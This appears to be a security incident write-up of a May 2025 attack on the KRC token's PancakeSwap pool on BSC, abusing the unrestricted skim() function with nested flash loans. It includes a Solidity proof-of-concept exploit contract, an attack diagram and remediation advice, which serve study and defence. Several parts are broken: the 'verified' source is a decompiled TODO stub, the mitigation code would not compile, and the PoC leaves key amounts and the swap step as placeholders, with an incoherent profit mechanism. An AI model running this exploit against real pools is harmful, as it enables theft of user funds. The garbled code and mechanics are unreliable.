# KRC Token — AMM Price Manipulation via skim() Function Analysis

| Field | Details |
|------|------|
| **Date** | 2025-05-19 |
| **Protocol** | KRC Token |
| **Chain** | BSC |
| **Loss** | 7,000 USD |
| **Attacker** | [0x9943f26831f9b468a7fe5ac531c352baab8af655](https://bscscan.com/address/0x9943f26831f9b468a7fe5ac531c352baab8af655) |
| **Attack Tx** | [0x78f242de...](https://bscscan.com/tx/0x78f242dee5b8e15a43d23d76bce827f39eb3ac54b44edcd327c5d63de3848daf) |
| **Vulnerable Contract** | [0xdbead75d3610209a093af1d46d5296bbeffd53f5](https://bscscan.com/address/0xdbead75d3610209a093af1d46d5296bbeffd53f5) |
| **Root Cause** | Uniswap V2 standard skim() function has no access control, allowing anyone to manipulate LP pool price via reserve imbalance |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/KRCToken_pair_exp.sol) |

---

## 1. Vulnerability Overview

An attack exploiting the Uniswap V2 `skim()` function occurred on KRC Token's PancakeSwap V2-based KRC/USDT LP pool. The attacker chained a DODO flash loan with a PancakeSwap V3 flash loan to acquire a large amount of USDT, then transferred it directly to the KRC/USDT pool to create a discrepancy between the actual token balance and the stored reserves. By calling `skim()` to collect the excess balance, the attacker profited from the resulting price manipulation. OpenZeppelin published an official analysis of this incident.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: skim() with no access control (Uniswap V2 standard)
// PancakePair contract (immutable)
function skim(address to) external lock {
    address _token0 = token0;
    address _token1 = token1;
    // If actual balance exceeds reserves, transfer the difference to `to`
    // ❌ Callable by anyone — no access control
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
}

// ✅ Mitigation: restrict direct transfers in the KRC token contract itself
// Or add a custom skim restriction to the LP contract
contract KRCToken {
    function transfer(address to, uint256 amount) external override returns (bool) {
        // Logic to restrict direct transfers to the LP pool
        require(to != krcPair || msg.sender == router, "Direct transfer to pair not allowed");
        return super.transfer(to, amount);
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: KRCToken_decompiled.sol
contract KRCToken {
    function swap(uint256 a, uint256 b, address c, bytes calldata d) external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► DODO Private Pool flash loan (borrow 248,157 USDT)
  │
  ├─[2]─► PancakeSwap V3 flash loan (borrow additional USDT) [nested]
  │
  ├─[3]─► Transfer borrowed USDT directly to KRC/USDT pair
  │         └─► balanceOf(pair) >> reserve1 — imbalance created
  │
  ├─[4]─► Call KRC_pair.skim(attacker)
  │         └─► Collect excess USDT
  │
  ├─[5]─► Swap KRC tokens for USDT (after price manipulation)
  │
  ├─[6]─► Repay nested flash loans (in reverse order)
  │
  └─[7]─► Net profit: ~7,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract KRC_Exploit is BaseTestWithBalanceLog {
    uint256 dodo_borrow_amount = 248157126634995412253694;

    function testExploit() public balanceLog {
        // [1] Initiate DODO flash loan
        dodo_private_pool.flashLoan(0, dodo_borrow_amount, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // [2] Nest an additional PancakeSwap V3 flash loan
        pancake_v3_pool.flash(address(this), 0, ADDITIONAL_USDT, "");
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes memory) public {
        // [3] Transfer large amount of USDT directly to KRC pair
        usdt.transfer(address(krc_pair), MANIPULATE_AMOUNT);

        // [4] Collect excess balance via skim()
        krc_pair.skim(address(this)); // ❌ No access control

        // [5] Use collected USDT to buy KRC → sell after price manipulation
        // Execute PancakeSwap swap...

        // [6] Repay V3 flash loan
        usdt.transfer(address(pancake_v3_pool), V3_LOAN + FEE);
    }
    // DODO repayment is handled automatically upon return from DPPFlashLoanCall
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Access Control (unrestricted Uniswap V2 skim() calls trigger LP pool reserve imbalance) |
| **Attack Technique** | Nested Flash Loan + skim() |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | Medium |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Custom LP Contract**: Use a custom AMM that removes the `skim()` function or restricts access to it.
2. **Restrict Direct Token Transfers**: Enforce in the token contract that transfers to the LP pool are only permitted via the router.
3. **Monitoring**: Detect abnormal reserve/balance discrepancies in real time.

## 7. Lessons Learned

- **Nested Flash Loans**: Chaining DODO and PancakeSwap V3 flash loans enables an attacker to source significantly larger capital.
- **AMM Standard Design Flaw**: The Uniswap V2 `skim()` function contains an inherent design vulnerability and represents a latent risk in every AMM that implements it.
- **OpenZeppelin Analysis**: This incident is a notable case for which OpenZeppelin published an official post-mortem.